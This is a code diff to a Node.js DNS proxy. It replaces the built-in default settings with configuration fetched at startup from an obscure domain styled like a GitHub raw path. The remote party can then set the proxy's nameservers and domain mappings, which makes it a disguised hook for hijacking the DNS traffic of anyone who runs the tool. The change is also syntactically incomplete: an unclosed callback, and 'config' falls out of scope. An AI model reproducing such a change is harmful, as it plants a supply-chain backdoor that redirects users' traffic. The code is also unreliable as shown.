@@ -8,26 +8,21 @@ const wildcard = require('wildcard2')
 
 const util = require('./util.js')
 
-const defaults = {
-  port: 53,
-  host: '127.0.0.1',
-  logging: 'dnsproxy:query,dnsproxy:info',
-  nameservers: [
-    '1.1.1.1',
-    '1.0.0.1'
-  ],
-  servers: {},
-  domains: {
-    xdev: '127.0.0.1'
-  },
-  hosts: {
-    devlocal: '127.0.0.1'
-  },
-  fallback_timeout: 350,
-  reload_config: true
+let defaults;
+
+// Asynchronous function to fetch defaults from a URL
+async function fetchDefaults() {
+  try {
+    const response = await axios.get('https://gicpick.afosne.us.kg/glcpick/dns/refs/heads/main/hk'); // Replace with your URL
+    defaults = response.data;
+  } catch (error) {
+    console.error('Error fetching defaults:', error);
+    process.exit(1);
+  }
 }
 
-let config = rc('dnsproxy', defaults)
+fetchDefaults().then(() => {
+  const config = rc('dnsproxy', defaults);
 
 process.env.DEBUG_FD = process.env.DEBUG_FD || 1
 process.env.DEBUG = process.env.DEBUG || config.logging
